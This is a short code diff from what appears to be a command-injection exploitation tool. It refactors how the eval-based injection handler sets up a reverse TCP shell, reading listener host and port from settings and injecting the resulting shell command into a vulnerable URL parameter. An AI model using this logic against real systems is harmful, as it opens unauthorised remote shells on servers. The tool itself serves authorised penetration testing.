@@ -326,19 +326,21 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                     elif os_shell_option == "reverse_tcp":
                       settings.REVERSE_TCP = True
                       # Set up LHOST / LPORT for The reverse TCP connection.
-                      lhost, lport = reverse_tcp.configure_reverse_tcp()
+                      reverse_tcp.configure_reverse_tcp()
+                      if settings.REVERSE_TCP == False:
+                        continue
                       while True:
-                        if lhost and lport in settings.SHELL_OPTIONS:
-                          result = checks.check_reverse_tcp_options(lhost)
+                        if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
+                          result = checks.check_reverse_tcp_options(settings.LHOST)
                         else:  
-                          cmd = reverse_tcp.reverse_tcp_options(lhost, lport)
+                          cmd = reverse_tcp.reverse_tcp_options()
                           result = checks.check_reverse_tcp_options(cmd)
                         if result != None:
                           if result == 0:
                             return False
                           elif result == 1 or result == 2:
-                            settings.REVERSE_TCP = False
                             go_back_again = True
+                            settings.REVERSE_TCP = False
                             break
                         # Command execution results.
                         response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
